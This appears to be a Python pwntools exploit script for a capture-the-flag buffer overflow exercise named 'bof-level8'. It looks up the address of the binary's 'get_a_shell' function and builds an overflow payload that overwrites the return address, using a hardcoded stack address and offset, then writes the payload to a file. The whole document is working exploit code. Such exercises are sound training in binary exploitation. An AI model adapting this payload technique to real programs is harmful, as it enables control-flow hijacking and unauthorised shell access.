#!/usr/bin/env python
from pwn import	*
# LOL=KJADGJKHGSDZJHFGSJHDGFHJGSD
# stack offset to overwrite rip
stack_offset = 0x88
stack = p64(0x7fffffffe320)
p = process("./bof-level8")

# print output
print(p.recv(0x200))

# load the program as an ELF object
e = ELF("./bof-level8")

# get the address of get_a_shell
shell_address = e.symbols['get_a_shell']

print hex(shell_address)

buffer = 'A'*8 + p64(shell_address) + stack*17 + "\x60"

with open('pattern.txt', 'w') as f:
    f.write(buffer)
